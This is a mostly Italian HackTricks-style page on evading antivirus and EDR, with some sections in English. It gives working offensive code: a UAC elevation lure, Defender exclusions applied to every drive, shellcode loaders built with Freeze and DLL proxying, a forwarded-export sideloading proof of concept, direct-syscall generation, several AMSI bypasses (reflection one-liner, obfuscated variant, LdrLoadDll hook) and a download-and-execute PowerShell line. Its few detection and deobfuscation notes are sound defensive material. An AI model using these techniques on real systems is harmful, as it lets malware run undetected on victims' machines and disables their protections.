# Bypass dell'Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Ferma Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire il funzionamento di Windows Defender fingendo di essere un altro AV.
- [Disabilita Defender se sei admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di gioco vengono spesso distribuiti come installer Node.js/Nexe non firmati che prima **chiedono all'utente l'elevazione** e solo dopo disabilitano Defender. Il flusso è semplice:

1. Verifica la presenza di un contesto amministrativo con `net session`. Il comando ha successo solo quando il chiamante dispone dei diritti di admin, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Si rilancia immediatamente con il verbo `RunAs` per attivare il previsto prompt di consenso UAC, preservando al contempo la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di stare installando software “crackato”, quindi il prompt viene solitamente accettato, dando al malware i diritti necessari per modificare la policy di Defender.<sup>[[26]](#references)</sup>

### Esclusioni `MpPreference` generalizzate per ogni lettera di unità

Una volta ottenuti i privilegi elevati, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare direttamente il servizio. Il loader termina prima il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`), quindi applica **esclusioni estremamente ampie**, rendendo non analizzabili ogni profilo utente, directory di sistema e disco rimovibile:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni principali:

- Il loop percorre ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro depositato ovunque sul disco viene ignorato**.
- L’esclusione dell’estensione `.sys` è lungimirante: gli attacker si riservano la possibilità di caricare in seguito driver non firmati senza dover intervenire nuovamente su Defender.
- Tutte le modifiche vengono applicate sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permettendo agli stage successivi di confermare che le esclusioni persistano o di ampliarle senza riattivare l’UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli superficiali dello stato continuano a indicare “antivirus attivo”, anche se l’ispezione in tempo reale non analizza mai quei percorsi.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Attualmente, gli AV utilizzano metodi diversi per verificare se un file è malicious o meno: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico si ottiene segnalando stringhe o array di byte noti come malicious all’interno di un binary o di uno script, oltre a estrarre informazioni dal file stesso (ad esempio descrizione del file, nome dell’azienda, firme digitali, icona, checksum, ecc.). Ciò significa che l’utilizzo di tool pubblici noti può farti rilevare più facilmente, poiché probabilmente sono già stati analizzati e contrassegnati come malicious. Esistono diversi modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se esegui l’encryption del binary, l’AV non sarà in grado di rilevare il tuo programma, ma avrai bisogno di una sorta di loader per decrittarlo ed eseguirlo in memoria.

- **Obfuscation**

A volte è sufficiente modificare alcune stringhe nel binary o nello script per superare l’AV, ma può essere un’attività dispendiosa in termini di tempo, a seconda di ciò che stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi tool, non ci saranno signature note di contenuti malicious, ma ciò richiede molto tempo e impegno.

> [!TIP]
> Un buon metodo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica, divide il file in più segmenti e incarica Defender di analizzarli singolarmente; in questo modo può indicarti esattamente quali stringhe o byte sono stati segnalati nel tuo binary.

Ti consiglio vivamente di consultare questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull’AV Evasion pratica.

### **Analisi dinamica**

L’analisi dinamica si verifica quando l’AV esegue il tuo binary in una sandbox e osserva eventuali attività malicious (ad esempio tentare di decrittare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po’ più complessa, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Sleep before execution** A seconda di come viene implementato, può essere un ottimo modo per eludere l’analisi dinamica dell’AV. Gli AV hanno pochissimo tempo per analizzare i file, così da non interrompere il workflow dell’utente; l’utilizzo di sleep prolungati può quindi ostacolare l’analisi dei binary. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep, a seconda di come è stato implementato.
- **Checking machine's resources** Di solito le sandbox hanno risorse molto limitate con cui lavorare (ad esempio < 2 GB di RAM), altrimenti potrebbero rallentare la macchina dell’utente. Anche in questo caso puoi essere molto creativo: per esempio, controllando la temperatura della CPU o persino la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi prendere di mira un utente la cui workstation è unita al dominio `"contoso.local"`, puoi controllare il dominio del computer per verificare se corrisponde a quello specificato; in caso contrario, puoi fare in modo che il programma termini.

È emerso che il computername della Sandbox di Microsoft Defender è HAL9TH; puoi quindi verificare il nome del computer nel tuo malware prima della detonation. Se il nome corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender, quindi puoi fare in modo che il programma termini.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi suggerimenti da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo già detto in questo post, i **public tools** prima o poi **verranno rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi eseguire il dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un project diverso, meno conosciuto, che esegua anch’esso il dump di LSASS?

La risposta corretta probabilmente è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei, se non il, malware più segnalati dagli AV e dagli EDR; sebbene il project in sé sia molto valido, è anche un incubo da utilizzare per eludere gli AV. Cerca quindi alternative per ciò che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l’evasion, assicurati di **disattivare l’invio automatico dei sample** in Defender e, per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere l’evasion a lungo termine. Se vuoi verificare se il tuo payload viene rilevato da un AV specifico, installalo su una VM, prova a disattivare l’invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, **dai sempre priorità all’utilizzo delle DLL per l’evasion**; secondo la mia esperienza, i file DLL vengono solitamente **rilevati e analizzati molto meno**, quindi in alcuni casi è un trucco molto semplice per evitare il rilevamento (a condizione, ovviamente, che il tuo payload possa essere eseguito come DLL).

Come possiamo vedere in questa immagine, un DLL Payload di Havoc ha un detection rate di 4/26 su antiscan.me, mentre l’EXE payload ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un payload EXE normale di Havoc e una DLL normale di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi utilizzare con i file DLL per essere molto più stealthy.

## DLL Sideloading & Proxying

Il **DLL Sideloading** sfrutta l’ordine di ricerca delle DLL utilizzato dal loader, posizionando l’applicazione vittima e i payload malicious affiancati.

Puoi verificare quali programmi sono suscettibili al DLL Sideloading utilizzando [Siofra](https://github.com/Cybereason/siofra) e il seguente script PowerShell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l’elenco dei programmi suscettibili a DLL hijacking all’interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**; questa tecnica, se eseguita correttamente, è piuttosto stealth, ma se utilizzi programmi DLL Sideloadable noti pubblicamente, potresti essere individuato facilmente.

Il semplice posizionamento di una DLL malevola con il nome che un programma si aspetta di caricare non consentirà di caricare il tuo payload, poiché il programma si aspetta che all’interno di quella DLL siano presenti funzioni specifiche. Per risolvere questo problema, useremo un’altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate effettuate da un programma dalla DLL proxy (e malevola) alla DLL originale, preservando così le funzionalità del programma e consentendo di gestire l’esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un Detection rate di 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare il [VOD su Twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sul DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per saperne di più e approfondire gli argomenti discussi.

### Abusing Forwarded Exports (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che sono in realtà dei "forwarders": invece di puntare al codice, la voce di export contiene una stringa ASCII nella forma `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già stato caricato
- Risolve `TargetFunc` da esso

Comportamenti fondamentali da comprendere:
- Se `TargetDll` è un KnownDLL, viene fornito dal namespace protetto KnownDLLs (ad esempio ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è un KnownDLL, viene utilizzato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo il forward resolution.

Questo abilita una primitiva di sideloading indiretto: trovare una DLL firmata che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, quindi collocare la DLL firmata insieme a una DLL controllata dall'attaccante denominata esattamente come il modulo target inoltrato. Quando viene invocato l'export inoltrato, il loader risolve il forward e carica la propria DLL dalla stessa directory, eseguendo la relativa DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copy-paste):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` dannosa nella stessa cartella. È sufficiente una DllMain minimale per ottenere l'esecuzione del codice; non è necessario implementare la funzione inoltrata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (signed) carica `keyiso.dll` side-by-side (signed)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, si verifica un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export inoltrati in cui il modulo di destinazione non è una KnownDLL. Le KnownDLL sono elencate in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export inoltrati con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento e la difesa:
- Monitora i LOLBins (ad esempio, rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di DLL non-KnownDLLs con lo stesso nome di base da quella directory
- Genera un avviso per catene di processi/moduli come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` all'interno di percorsi scrivibili dall'utente
- Applica policy di integrità del codice (WDAC/AppLocker) e nega i permessi di scrittura+esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo stealth.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasion è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo tool; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Gli EDR spesso applicano **user-mode inline hooks** agli stub delle syscall di `ntdll.dll`. Per bypassare questi hook, puoi generare stub di syscall **direct** o **indirect** che caricano l'**SSN** (System Service Number) corretto ed effettuano la transizione alla modalità kernel senza eseguire l'entrypoint dell'export sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (senza raggiungere un export di `ntdll`).
- **Indirect**: salta a un gadget `syscall` esistente all'interno di `ntdll`, in modo che la transizione al kernel sembri provenire da `ntdll` (utile per l'evasion euristica); **randomized indirect** seleziona un gadget da un pool a ogni chiamata.
- **Egg-hunt**: evita di incorporare su disco la sequenza statica di opcode `0F 05`; risolve una sequenza syscall a runtime.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub delle syscall in base all'indirizzo virtuale invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dalla relativa sezione `.text`, quindi esegue l'unmap (bypassa tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento VA con la validazione degli opcode quando uno stub è pulito; se è sottoposto a hook, ricorre alla deduzione tramite VA.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e utilizza un VEH per acquisire l'SSN da `EAX` a runtime, senza analizzare i byte sottoposti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di eseguire la scansione solo dei **file presenti sul disco**, quindi, se si riusciva in qualche modo a eseguire i payload **direttamente in memoria**, l'AV non poteva fare nulla per impedirlo, poiché non disponeva di una visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- User Account Control, o UAC (elevazione di EXE, COM, MSI o installazione di ActiveX)
- PowerShell (script, utilizzo interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di esaminare il comportamento degli script esponendone i contenuti in una forma non crittografata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Si noti come anteponga `amsi:` e successivamente il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file sul disco, ma siamo comunque stati rilevati in memoria a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito tramite AMSI. Questo riguarda persino `Assembly.Load(byte[])` per caricare un'esecuzione in memoria. Per questo motivo, se si desidera eludere AMSI, per l'esecuzione in memoria è consigliato utilizzare versioni inferiori di .NET (come la 4.7.2 o precedenti).

Esistono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente tramite rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se presentano più livelli, quindi l'obfuscation potrebbe essere una scelta svantaggiosa a seconda di come viene eseguita. Questo rende l'elusione tutt'altro che immediata. A volte, però, è sufficiente modificare un paio di nomi di variabili per risolvere il problema, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo powershell (e anche cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente persino con un utente senza privilegi. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione di AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Inizialmente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un utilizzo più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Naturalmente, questa riga è stata rilevata da AMSI stessa, quindi sono necessarie alcune modifiche per utilizzare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente verrà segnalato una volta pubblicato questo post, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere undetected.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni che restituiscano il codice E_INVALIDARG; in questo modo, il risultato della scansione effettiva sarà 0, interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche utilizzate per bypassare AMSI con powershell; consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questa repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Bloccare AMSI impedendo il caricamento di amsi.dll (LdrLoadDll hook)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'inserire un hook user-mode su `ntdll!LdrLoadDll` che restituisca un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non vengono eseguite scansioni per quel processo.<sup>[[23]](#references)</sup>

Schema dell'implementazione (pseudocodice C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e custom loader allo stesso modo (qualsiasi componente che altrimenti caricherebbe AMSI).
- Da abbinare all'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti estesi nella command line.
- Utilizzato anche da loader eseguiti tramite LOLBins (ad esempio, `regsvr32` che richiama `DllRegisterServer`).

Anche il tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera script per bypassare AMSI.
Il tool **[https://amsibypass.com/](https://amsibypass.com/)** genera anch'esso script per bypassare AMSI che evitano le signature tramite funzioni e variabili definite dall'utente, espressioni di caratteri randomizzate e applicando una combinazione casuale di maiuscole e minuscole alle keyword di PowerShell per evitare le signature.

**Rimuovere la signature rilevata**

Puoi utilizzare un tool come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo tool funziona eseguendo la scansione della memoria del processo corrente alla ricerca della signature AMSI e sovrascrivendola con istruzioni NOP, rimuovendola di fatto dalla memoria.

**Prodotti AV/EDR che utilizzano AMSI**

Puoi trovare un elenco dei prodotti AV/EDR che utilizzano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utilizzare PowerShell versione 2**
Se utilizzi PowerShell versione 2, AMSI non verrà caricato, quindi potrai eseguire i tuoi script senza che vengano analizzati da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. This can be useful for auditing and troubleshooting purposes, but it can also be a **problem for attackers who want to evade detection**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: You can use a tool such as [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) for this purpose.
- **Use Powershell version 2**: If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Use [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) to host PowerShell without launching `powershell.exe` (the approach used by Cobalt Strike's `powerpick`). This evades controls tied specifically to the `powershell.exe` process, but it does not inherently disable AMSI, Script Block Logging, or every other PowerShell defense; coverage depends on the runtime and host implementation.


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): l'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire una maggiore sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione contro la manomissione.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, al momento della compilazione, codice offuscato senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): aggiunge un livello di operazioni offuscate generate dal framework di template metaprogramming di C++, rendendo leggermente più difficile la vita a chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un obfuscator di binari x64 in grado di offuscare diversi PE, tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorphic per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation a grana fine per linguaggi supportati da LLVM, che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di assembly trasformando le istruzioni normali in catene ROP, ostacolando la nostra concezione naturale del normale control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

### Self-masking per funzione assistito dal compilatore LLVM

Invece di mascherare un intero implant solo mentre è inattivo, un backend LLVM X86 modificato può mantenere selezionate funzioni mascherate con XOR ogni volta che sono inattive. Il PoC Function Peekaboo seleziona i nomi demangled che contengono `REG_`, inserisce stub di ingresso/uscita position-independent attorno al codice macchina finale e genera un unico masking handler condiviso in `.text`; le signature a livello sorgente e la calling convention Windows x64 rimangono invariate.<sup>[[38]](#references)[[39]](#references)</sup>

